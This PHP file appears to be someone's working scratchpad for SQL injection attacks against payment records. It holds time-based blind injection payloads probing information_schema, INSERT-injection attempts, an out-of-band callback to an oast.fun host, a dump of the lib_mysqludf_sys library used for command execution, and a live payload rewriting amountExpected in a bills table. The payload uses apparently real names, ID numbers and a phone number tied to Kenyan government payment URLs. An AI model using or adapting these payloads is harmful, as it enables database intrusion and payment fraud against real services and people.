<?php
$_GET['online'] = '';
include './includes/sql_conn.php';
//include './includes/conn.php';
//*


// /SELECT(IF(1=2,INSERT INTO logo(id,name,image)VALUES(51,'ijjkgect','gerg'),1)

//SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo'))=5,INSERT INTO logo(name,image)VALUES('ijjkgect','gerg'),1))

//////////////////////////////////////////////////////////////////////////////////////
//SELECT * FROM country WHERE region='Africa'  ----- original code

//(SELECT(COUNT(*))FROM%20information_schema.schemata) ---- target code

//(select*from(select(sleep(20)))a) ------ injection test code

//(SELECT(IF(ASCII(SUBSTRING((SELECT(COUNT(*))FROM%20information_schema.schemata),1,1))=2,SLEEP(5),1))) ---- target code blind injection code

//https%3a%2f%2fukrzmi.com%2flab.php'%2b(SELECT(IF(ASCII(SUBSTRING((SELECT(COUNT(*))FROM%20information_schema.schemata),1,1))=2,SLEEP(5),1)))%2b' ------ target parameter with injected code

//Africa'%2b(SELECT(IF(ASCII(SUBSTRING((SELECT(COUNT(*))FROM%20information_schema.schemata),1,1))=2,SLEEP(5),1)))%2b' -------- parameter 2 with injected code

//Africa'%2b(select*from(select(sleep(20)))a)%2b' -------- parameter 2 with injected test code

//SELECT * FROM country WHERE region='Africa'+(select*from(select(sleep(20)))a)+''  --------------- original code embed injection test code

//SELECT * FROM country WHERE region='Africa'+(SELECT(IF(ASCII(SUBSTRING((SELECT(COUNT(*))FROM information_schema.schemata),1,1))=3,0,1)))+'' ------ original code + injected code(pure)



//SELECT * FROM logo WHERE name IN (SELECT * FROM (INSERT INTO logo (name,image) VALUES ('valueA', 'valueB')) AS subquery) - GPT 1
//////////////////////////////////////////////////////////////////////////////////////


//$query = "(REPLACE INTO logo(name,width)SELECT'logo.png','14'WHERE 1=1)";
//$query = "(INSERT INTO logo(name,width)SELECT'logo.png','14'WHERE 1=1)";
//$query = "(INSERT INTO category('logo.png'))";
//$query = "(select*from(select(sleep(10)))union INSERT INTO logo(name,width)SELECT'logo.png','14'WHERE 1=1)";
//$query = "(select*from(select(sleep(10)))a)";
//$query = "INSERT%20INTO%20logo(name,image,width,height)VALUES('inject','inject','inject','3')";
//$query = "INSERT%20INTO%20logo%20VALUES(111,222,221,366,464,124,523,345)";
//$query = "INSERT%20INTO%20logo(name)VALUES('ijjkgect')";
//$query = "(select(INSERT%20INTO%20logo(name)VALUES('ijjkgect')))";
//$query = "(INSERT%20INTO%20logo(name,image,width,height)VALUES('ijjkgect','inject','inject','inject'))";
//$query = 'SLEEP(5)';
//INSERT INTO bills(apiClientID,billDesc,billRefNumber,serviceID,clientMSISDN,clientName,clientEmail,clientIDNumber,amountExpected,status,currency,commission,net,notificationURL,dateCreated) values('4','Vehicle Inquiry','TIMS-MVR-10374947','46','+254793060164','TIMONA MBURU WAMBUI','','30945371','550','2','KES','50','500','https://ukrzmi.com/lab.php','2023-05-27 14:33:58')
$word = "pesaflow";
//$word = "\\\\kotnova.chp0eah2vtc0000dnx6gge5y8fcyyyyyb.oast.fun\\a";
$hex = '0x' . bin2hex($word);
// ON DUPLICATE KEY UPDATE c=c+1
//2023-05-27 14:33:58
$query = "164','ALEX WANGANGA WARORUA','','39290974','11','2','KES','1','10','https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn','2023%2d05%2d30 14%3A33%3A58') ON DUPLICATE KEY UPDATE amountExpected%3d11%3b %2d%2d";
//$query = "%2B254793060164','TIMONA MBURU WAMBUI','','30945371','11','2','KES','1','10','https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm','2023')%3b %2d%2d";
//$query = "+254793060164','TIMONA MBURU WAMBUI','','30945371','11','2','KES','1','10','https://tims.ntsa.go.ke/pay/payFail.htm','2023'); --";
$sleep_timer = 5;
$target = 1;
//$query = urlencode($query);
$query = str_replace(' ','%20',$query);
$i = 'VALID QUERY';
$hex = '';
$state = ['id'=>1];
echo custom_code($sleep_timer, $target, $query, $i, $hex, $state);
echo $query;
//*/
/*
$totp = PedroSancao\OTP\TOTP::create();
$uri = $totp->getUri('Warorua', 'KEVER');
$src = 'https://chart.googleapis.com/chart?chs=200x200&chld=M|0&cht=qr&chl=' . urlencode($uri);
printf('<img src="%s"/>', $src);
//echo $totp->getSecretReadable();
$secret = $totp->getRawSecret();
echo base64_encode($secret);

$totp = PedroSancao\OTP\TOTP::createRaw($authenticationSecret);
$code = intval($_GET['ch']);
if ($totp->verify($code)) {
 echo 'Verified<br/>';
}else{
    echo 'Not verified<br/>';
}
echo $code;

$dt1 = base64_encode(file_get_contents('./sql/lib_mysqludf_sys/lib_mysqludf_sys.so'));
echo $dt1;
//*/